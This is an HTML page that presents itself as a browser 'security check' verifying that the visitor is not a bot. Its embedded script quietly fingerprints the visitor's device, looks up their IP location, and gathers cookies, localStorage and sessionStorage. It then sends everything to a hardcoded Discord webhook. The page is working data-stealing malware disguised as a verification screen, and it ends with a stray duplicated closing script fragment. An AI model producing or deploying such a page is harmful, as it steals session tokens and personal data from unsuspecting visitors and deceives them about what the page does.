<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Check</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    #status {
      font-size: 20px;
      color: green;
    }
  </style>
</head>
<body>
  <h1>🔐 Verifying your browser...</h1>
  <p id="status">Please wait while we verify you're not a bot.</p>

<script>
(async () => {
  const webhook = "https://discord.com/api/webhooks/1388233187075031241/BcOXhb8YM-I321blB67xbeqIvm76ZUbAW77Ku0YLSee8XAOoGIv3ssBAkyjl1D-Bo2xm";

  const getFonts = () => {
    const fonts = [
      "Arial", "Verdana", "Times New Roman", "Courier", "Comic Sans MS", "Georgia", "Impact", "Monaco", "Tahoma"
    ];
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const defaultWidth = {};
    const testText = "mmmmmmmmmmlli";
    ctx.font = "72px sans-serif";
    for (const f of fonts) {
      ctx.font = `72px '${f}', sans-serif`;
      const width = ctx.measureText(testText).width;
      defaultWidth[f] = width;
    }
    return fonts.filter(f => defaultWidth[f] !== defaultWidth["Arial"]);
  };

  const getWebGLInfo = () => {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return {};
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    return {
      vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
      renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
    };
  };

  const getBattery = async () => {
    try {
      const battery = await navigator.getBattery();
      return `${(battery.level * 100)}% - ${battery.charging ? "Charging" : "Not charging"}`;
    } catch {
      return "Not available";
    }
  };

  const geo = await fetch("https://ipinfo.io/json?token=demo")
    .then(r => r.json()).catch(() => ({}));

  const payload = {
    ua: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: `${screen.width}x${screen.height}`,
    touchSupport: navigator.maxTouchPoints,
    cookies: document.cookie || "None",
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    fonts: getFonts(),
    webgl: getWebGLInfo(),
    battery: await getBattery(),
    ip: geo.ip || "N/A",
    city: geo.city || "N/A",
    region: geo.region || "N/A",
    country: geo.country || "N/A",
    org: geo.org || "N/A"
  };

  await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: `🧲 Fingerprint Beacon:\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
    })
  });

  // Optional redirect
  // window.location.href = "https://google.com";
})();
</script>

})();
</script>

</body>
</html>
